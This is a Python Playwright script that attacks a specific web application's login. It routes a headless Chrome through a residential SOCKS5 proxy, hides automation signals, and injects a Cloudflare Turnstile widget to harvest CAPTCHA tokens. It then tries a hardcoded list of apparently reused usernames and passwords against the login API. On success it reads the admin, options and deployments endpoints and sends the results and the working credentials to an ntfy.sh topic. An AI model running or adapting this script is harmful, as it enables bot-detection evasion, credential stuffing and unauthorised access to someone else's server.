#!/usr/bin/env python3
# i53683: GHA public runner (root, xvfb + real Chrome) solves the production Cloudflare Turnstile
# by routing the WHOLE browser context through the RCN residential SOCKS5 (193.218.118.128:1080),
# so Cloudflare sees a residential IP. To avoid the 2.3MB SPA bundle timing out over the slow
# residential link, we abort big JS assets and inject a MINIMAL Turnstile widget ourselves on the
# real .37 origin (sitekey 0x4AAAAAAGDEObVt9sc3zTw_). brunhild is IPv6-only; we force it to IPv4
# via --host-resolver-rules. Once a siteverify-accepted cf-turnstile-response is obtained we do a
# low-rate single-shot /api/user/login from the SAME proxied page (same remoteip) with the operator
# password corpus; on success read /api/user/self, /api/option/ (confirm role=100) and assess
# /api/deployments. Results -> stdout + ntfy topic.
import os, sys, time, json, urllib.request

PROXY = os.environ.get("PROXY", "193.218.118.128:1080")
TARGET = os.environ.get("TARGET", "http://135.148.204.37").rstrip("/")
SITEKEY = os.environ.get("SITEKEY", "0x4AAAAAAGDEObVt9sc3zTw_")
NT = os.environ.get("NT", "").strip()
BUDGET = int(os.environ.get("BUDGET", "1500"))
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

# Operator password corpus (reused creds) against likely admin usernames. Ordered most-likely first.
USERS = ["i33953admin", "root", "admin", "administrator", "yangxiaokai", "haoyang"]
PWS = ["xinhuo.yibuapi!@#", "NewSecurePassword123!", "12345678", "6iHKLZEmQQ4BesSg",
       "yibumysql", "yibumysql123"]
CREDS = []
# priority interleave: put user xinhuo first, then per-user pws
_custom = os.environ.get("CREDS", "").strip()
if _custom:
    try:
        for x in json.loads(_custom):
            CREDS.append((x["u"], x["p"]) if isinstance(x, dict) else (x[0], x[1]))
    except Exception as e:
        print("CREDS parse error:", e, flush=True)
if not CREDS:
    CREDS = [("i33953admin", "xinhuo.yibuapi!@#"), ("root", "xinhuo.yibuapi!@#"),
             ("admin", "xinhuo.yibuapi!@#"), ("yangxiaokai", "xinhuo.yibuapi!@#"),
             ("i33953admin", "NewSecurePassword123!"), ("root", "NewSecurePassword123!"),
             ("i33953admin", "12345678"), ("root", "12345678"),
             ("i33953admin", "6iHKLZEmQQ4BesSg"), ("root", "6iHKLZEmQQ4BesSg"),
             ("i33953admin", "yibumysql"), ("root", "yibumysql"),
             ("administrator", "xinhuo.yibuapi!@#"), ("haoyang", "xinhuo.yibuapi!@#")]

def out(*a): print("[i53683]", *a, flush=True)

def ntfy(title, msg):
    if not NT: return
    try:
        urllib.request.urlopen(urllib.request.Request(
            "https://ntfy.sh/" + NT, data=msg.encode(),
            headers={"Title": title, "Priority": "high", "User-Agent": "i53683"}), timeout=20).read()
        out("ntfy sent:", title)
    except Exception as e:
        out("ntfy err:", str(e)[:120])

def launch(p):
    args = ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
            "--disable-blink-features=AutomationControlled",
            "--ignore-gpu-blocklist", "--enable-unsafe-swiftshader", "--use-angle=swiftshader",
            "--lang=en-US",
            # brunhild is IPv6-only upstream; force it to a known Cloudflare IPv4 (turnstile challenge host)
            "--host-resolver-rules=MAP brunhild.challenges.cloudflare.com 104.18.16.146"]
    for kw in [dict(channel="chrome"), dict()]:
        try:
            b = p.chromium.launch(headless=True, args=args, **kw)
            out("launched with", kw or "bundled")
            return b
        except Exception as e:
            out("launch", kw or "bundled", "failed:", str(e)[:140])
    return None

INJECT_JS = r"""
async (sitekey) => {
  // ensure a fresh container
  const old = document.getElementById('tsbox'); if (old) old.remove();
  const box = document.createElement('div'); box.id='tsbox'; document.body.appendChild(box);
  window.__tsTok = '';
  window.__tsErr = '';
  // load turnstile explicit-render api
  await new Promise((res, rej) => {
    if (window.turnstile && window.turnstile.render) return res();
    const s = document.createElement('script');
    s.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit';
    s.async = true; s.onload = ()=>res(); s.onerror = ()=>rej(new Error('api.js load error'));
    document.head.appendChild(s);
    setTimeout(()=>rej(new Error('api.js timeout')), 20000);
  });
  try {
    const wid = window.turnstile.render('#tsbox', {
      sitekey: sitekey,
      callback: (t)=>{ window.__tsTok = t; },
      'error-callback': (e)=>{ window.__tsErr = String(e); },
      'timeout-callback': ()=>{ window.__tsErr = 'timeout'; }
    });
    window.__tsWid = wid;
  } catch (e) { window.__tsErr = 'render:'+String(e); }
  return true;
}
"""

def get_token(page, timeout=90):
    try:
        page.evaluate(INJECT_JS, SITEKEY)
    except Exception as e:
        out("inject err:", str(e)[:160])
        # if api.js load failed, this is likely a proxy/domain issue; capture state
        return "", {"inject_err": str(e)[:200]}
    deadline = time.time() + timeout
    st = {}
    while time.time() < deadline:
        try:
            st = page.evaluate("""()=>{
                const v=document.querySelector('input[name="cf-turnstile-response"]');
                const ifr=[...document.querySelectorAll('iframe')].map(f=>f.src).filter(s=>/challenges\\.cloudflare|turnstile/.test(s));
                return {tok:window.__tsTok||(v?v.value:''), err:window.__tsErr||'', iframe:ifr[0]||null};
            }""")
        except Exception as e:
            st = {"err": "evaluate:"+str(e)[:120]}
        if st.get("tok") and len(st["tok"]) > 20:
            return st["tok"], st
        time.sleep(1.5)
    return "", st

def do_login(page, tok, u, pw):
    try:
        return page.evaluate("""async ([tok,u,p])=>{try{
            const r=await fetch('/api/user/login?turnstile='+encodeURIComponent(tok),
              {method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},
               body:JSON.stringify({username:u,password:p})});
            return {status:r.status, body:(await r.text()).slice(0,600)};
        }catch(e){return {err:String(e)};}}""", [tok, u, pw])
    except Exception as e:
        return {"err": str(e)[:160]}

def fetch_ep(page, ep):
    try:
        return page.evaluate("""async (ep)=>{try{
            const r=await fetch(ep,{headers:{'Accept':'application/json'}});
            return {status:r.status, body:(await r.text()).slice(0,1500)};
        }catch(e){return {err:String(e)};}}""", ep)
    except Exception as e:
        return {"err": str(e)[:160]}

def main():
    out("proxy", PROXY, "target", TARGET, "sitekey", SITEKEY, "ntfy", bool(NT), "creds", len(CREDS))
    from playwright.sync_api import sync_playwright
    res = {"proxy": PROXY, "target": TARGET, "egress": None, "loaded": False,
           "bundle_blocked": 0, "iframe": None, "first_token_len": 0, "attempts": [],
           "success": None, "self": None, "option": None, "deployments": None}
    with sync_playwright() as p:
        browser = launch(p)
        if browser is None:
            ntfy("i53683 FATAL", "no browser launch"); return
        ctx = browser.new_context(proxy={"server": "socks5://" + PROXY}, user_agent=UA,
                                  viewport={"width": 1280, "height": 900}, locale="en-US",
                                  extra_http_headers={"Accept-Language": "en-US,en;q=0.9"})
        ctx.add_init_script("""
            Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
            Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
            Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
            window.chrome=window.chrome||{runtime:{}};
        """)
        page = ctx.new_page()
        console, failed = [], []
        page.on("console", lambda m: console.append(f"{m.type}:{m.text}"[:160]))
        page.on("requestfailed", lambda r: failed.append(f"{r.url[:110]} :: {r.failure}"[:200]))

        # Block the heavy SPA JS bundles (abort >~200KB or /assets/, /static/js/) but keep HTML,
        # challenges.cloudflare.com, cdn-cgi and APIs. This prevents the 2.3MB bundle timing out.
        def route_handler(route):
            try:
                req = route.request
                url = req.url
                if ("challenges.cloudflare.com" in url or "cdn-cgi" in url
                        or "135.148.204.37/api/" in url):
                    return route.continue_()
                if req.resource_type == "script" or url.endswith(".js") or "/assets/" in url or "/static/js/" in url:
                    res["bundle_blocked"] += 1
                    return route.abort()
                return route.continue_()
            except Exception:
                try: return route.continue_()
                except Exception: return None
        ctx.route("**/*", route_handler)

        # egress identity (through the residential proxy)
        try:
            page.goto("https://ipinfo.io/json", timeout=30000)
            j = json.loads(page.inner_text("body"))
            res["egress"] = {k: j.get(k) for k in ("ip", "city", "region", "country", "org")}
            out("egress", res["egress"])
        except Exception as e:
            out("egress lookup fail", str(e)[:100])

        # load the real .37 origin (HTML shell; bundles blocked)
        loaded = False
        for att in range(3):
            try:
                page.goto(TARGET + "/sign-in", wait_until="domcontentloaded", timeout=45000)
                time.sleep(3)
                loaded = True
                out(f"signin att{att} loaded url={page.url} title={page.title()[:40]}")
                break
            except Exception as e:
                out(f"signin att{att} err", str(e)[:120]); time.sleep(2)
        res["loaded"] = loaded
        if not loaded:
            res["console"] = console[-20:]; res["failed"] = failed[-20:]
            ntfy("i53683 NOLOAD", json.dumps({"egress": res["egress"], "failed": res["failed"][-8:]}, ensure_ascii=False))
            browser.close(); return

        # First token (diagnostic-rich)
        t0 = time.time()
        tok, st = get_token(page, timeout=100)
        res["first_token_len"] = len(tok) if tok else 0
        res["iframe"] = (st or {}).get("iframe")
        out(f"first token_len={res['first_token_len']} iframe={res['iframe']} tsErr={(st or {}).get('err')}")
        try: page.screenshot(path="first.png")
        except Exception: pass
        if not tok:
            res["console"] = console[-25:]; res["failed"] = failed[-25:]
            res["diag"] = st
            ntfy("i53683 NOTOKEN", json.dumps({"egress": res["egress"], "iframe": res["iframe"],
                  "tsErr": (st or {}).get("err"), "bundle_blocked": res["bundle_blocked"],
                  "failed": res["failed"][-8:]}, ensure_ascii=False))
            browser.close()
            open("r53683.json", "w").write(json.dumps(res, ensure_ascii=False)); return

        ntfy("i53683 TOKEN", json.dumps({"egress": res["egress"], "token_len": len(tok),
              "iframe": res["iframe"], "bundle_blocked": res["bundle_blocked"]}, ensure_ascii=False))

        budget = time.time() + BUDGET
        for idx, (u, pw) in enumerate(CREDS):
            if time.time() > budget:
                out("BUDGET EXCEEDED at", idx); break
            if idx > 0:  # get a fresh single-use token for each attempt
                tok, st = get_token(page, timeout=60)
                if not tok:
                    out(f"idx={idx} no fresh token, stop"); break
            r = do_login(page, tok, u, pw)
            body = (r.get("body") or r.get("err", "") or "") if isinstance(r, dict) else str(r)
            crossed = ("turnstile" not in body.lower()) and ("校验失败" not in body)
            entry = {"idx": idx, "u": u, "pw": pw, "status": r.get("status") if isinstance(r, dict) else None,
                     "crossed": crossed, "body": body[:220]}
            res["attempts"].append(entry)
            out("attempt", json.dumps(entry, ensure_ascii=False))
            ok = False
            try: ok = json.loads(body).get("success") is True
            except Exception: ok = False
            if ok:
                res["success"] = {"u": u, "pw": pw}
                ntfy("i53683 LOGIN SUCCESS", json.dumps({"u": u, "body": body[:400]}, ensure_ascii=False))
                self_r = fetch_ep(page, "/api/user/self"); res["self"] = self_r
                out("SELF", json.dumps(self_r, ensure_ascii=False)[:600])
                opt_r = fetch_ep(page, "/api/option/"); res["option"] = opt_r
                dep_r = fetch_ep(page, "/api/deployments"); res["deployments"] = dep_r
                ntfy("i53683 SELF", json.dumps({"self": self_r, "option_status": (opt_r or {}).get("status"),
                      "dep_status": (dep_r or {}).get("status")}, ensure_ascii=False)[:1800])
                break
            time.sleep(2.0)
        browser.close()
    open("r53683.json", "w").write(json.dumps(res, ensure_ascii=False))
    out("DONE first_token_len=" + str(res["first_token_len"]) + " success=" + str(res["success"]))
    ntfy("i53683 FINAL", json.dumps({"success": res["success"], "first_token_len": res["first_token_len"],
          "n_attempts": len(res["attempts"]), "egress": res["egress"]}, ensure_ascii=False))

if __name__ == "__main__":
    main()
